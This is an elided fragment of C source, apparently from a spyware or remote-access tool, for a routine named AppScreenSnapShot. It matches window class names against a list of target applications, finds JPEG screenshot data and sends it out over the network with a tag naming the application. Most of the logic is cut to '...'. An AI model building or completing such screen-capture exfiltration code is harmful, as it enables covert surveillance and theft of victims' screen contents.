...
{ 
	...
	__try
	{
		...
		while(TRUE)
		{
			...
			if (bFindWinByClass == TRUE)
			{
				...
				for (iAppIndex = 0; iAppIndex < iAppCounter; iAppIndex ++)
				{
					if (lplstrcmpA(szWindowClassName,szAppWindowClassNameList[iAppIndex]) != 0 )
					{
						continue;
					}
					else
			...
			{  
				if ( *lpJpg == 0xff && *(lpJpg + 1) == 0xd8 && *(lpJpg + 2) == 0xff && *(lpJpg + 3) == 0xe0 )
				{
					...
					if (cTmp)
					{
						iRet = IndependentNetWork_SendMessage((char*)lpJpg,cTmp + 2 - (char*)lpJpg,APPSCREENSNAPSHOT,szAppNameList[iAppIndex]);
					}
				}
			}
	...
	__except (1)
	{
		WriteLittleBearLog("AppScreenSnapShot exception\r\n");
		return FALSE;
	}
}
